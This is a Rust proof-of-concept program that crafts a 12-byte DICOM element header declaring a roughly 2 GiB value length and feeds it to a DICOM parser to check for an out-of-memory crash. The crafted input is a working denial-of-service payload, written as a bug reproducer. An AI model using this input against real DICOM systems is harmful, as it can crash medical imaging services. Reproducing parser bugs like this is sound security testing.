use dicom_object::InMemDicomObject;
use dicom_transfer_syntax_registry::{TransferSyntaxIndex, TransferSyntaxRegistry};

fn main() {
    let ts = TransferSyntaxRegistry
        .get("1.2.840.10008.1.2.1")
        .expect("explicit VR little endian should be registered");

    // Hand-built explicit-VR-LE element header, VR=OB (4-byte length form), declaring a value
    // length of 0x7FFFFFFE (~2 GiB) - but with NO actual value bytes following. A conformant
    // stream would need ~2 GiB of trailing data; this attacker input is 12 bytes total.
    let mut wire = Vec::new();
    wire.extend_from_slice(&0x0009u16.to_le_bytes()); // group
    wire.extend_from_slice(&0x0001u16.to_le_bytes()); // element
    wire.extend_from_slice(b"OB"); // VR
    wire.extend_from_slice(&[0, 0]); // reserved
    wire.extend_from_slice(&0x7FFFFFFEu32.to_le_bytes()); // declared length: ~2 GiB

    println!("input size: {} bytes, declared value length: {} bytes (~{:.1} GiB)",
        wire.len(), 0x7FFFFFFEu32, 0x7FFFFFFEu32 as f64 / (1024.0 * 1024.0 * 1024.0));

    // If this process is still alive to print this line, the parser did not abort/OOM on the
    // declared length alone - it's blocked on `read_exact` waiting for (nonexistent) data, or it
    // returned an error gracefully. Either is fine; a SIGABRT/SIGKILL/OOM before this point is
    // the bug.
    let result = InMemDicomObject::read_dataset_with_ts(&wire[..], ts);
    match result {
        Ok(_) => println!("did not reproduce - parse unexpectedly succeeded"),
        Err(e) => println!("did not reproduce - parse failed gracefully with a normal Result::Err: {:?}", e),
    }
}
